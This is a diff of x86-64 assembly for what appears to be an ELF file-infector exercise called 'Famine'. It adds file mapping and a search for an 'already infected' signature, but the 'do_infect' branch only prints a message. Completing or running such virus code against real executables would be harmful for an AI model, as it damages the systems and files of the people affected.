@@ -90,7 +90,7 @@ _start:
     push rbx
 
     lea rdi, [rel file_path]
-    call is_infectable
+    call try_infect
 
     mov rax, SYS_CLOSE
     mov rdi, r8
@@ -101,7 +101,7 @@ _start:
     syscall
 
 ; rdi: file_path
-is_infectable:
+try_infect:
     open_file:
         mov rax, SYS_OPEN
         mov rsi, O_RDONLY
@@ -146,14 +146,18 @@ is_infectable:
     ; elf64_ident_check
 
     ; in: fd (r8)
-    ; out: ?
-    has_signature:
+    ; out: len (rax)
+    get_file_len:
         mov rax, SYS_LSEEK
         mov rdi, r8
         mov rsi, 0
         mov rdx, SEEK_END
         syscall
-        
+    ; get_file_len
+
+    ; in: fd (r8), len (rax)
+    ; out: addr (rax)
+    map_file:
         mov rsi, rax ; len
         mov rdi, 0 ; addr
         mov rax, SYS_MMAP
@@ -161,9 +165,54 @@ is_infectable:
         mov r10, MAP_PRIVATE
         mov r9, 0 ; pgoff
         syscall
+    ; map_file
+    
+    ; in: mapped_file (rax)
+    ; out: 1/0 (rax)
+    has_signature:
+        mov rcx, rsi ; len
+        lea rsi, [rel signature]
+        lea rax, [rax]
+        xor r8, r8
+        haystack_loop:
+            cmp r8, rcx
+            jae not_found
+            xor r9, r9
+            needle_loop:
+                cmp BYTE [rsi + r9], 0
+                je found
 
-        
+                mov r10, r8
+                add r10, r9
+                cmp r10, rcx
+                jae not_found
+
+                mov dl, BYTE [rsi + r9]
+                cmp dl, BYTE [rax + r10]
+                jne mov_haystack_ptr
+
+                inc r9
+                jmp needle_loop
+            ; needle_loop
+            mov_haystack_ptr:
+                inc r8
+                jmp haystack_loop
+
+            ; haystack_loop
+        not_found:
+            mov rax, 0
+            jmp eval
+        ; not_found
+        found:
+            mov rax, 1
+        ; found
     ; has_signature
+
+    eval:
+        cmp rax, 0
+        je do_infect
+        cmp rax, 1
+        je signature_found_exit
 
     add sp, 16
     ret
@@ -268,6 +317,28 @@ not_64_bit:
     jmp success
 ; not_64_bit
 
+signature_found_exit:
+    add rsp, 16
+    mov rax, SYS_WRITE
+    mov rdi, 1
+    lea rsi, [rel signature_found_msg]
+    mov rdx, 16
+    syscall
+    
+    jmp success
+; signature_found
+
+do_infect:
+    add rsp, 16
+    mov rax, SYS_WRITE
+    mov rdi, 1
+    lea rsi, [rel do_infect_msg]
+    mov rdx, 7
+    syscall
+    
+    jmp success
+; signature_found
+
 proc_self_exe:
     db "/proc/self/exe", 0
 proc_self_maps:
@@ -276,7 +347,11 @@ not_64_bit_msg:
     db "Not a 64 bit ELF", 10
 not_elf_msg:
     db "Not an ELF", 10
+signature_found_msg:
+    db "Found signature", 10
 file_path:
     db "Famine", 0
 signature:
-    db "signature", 0
+    db "abied-ch", 0
+do_infect_msg:
+    db "INFECT", 10
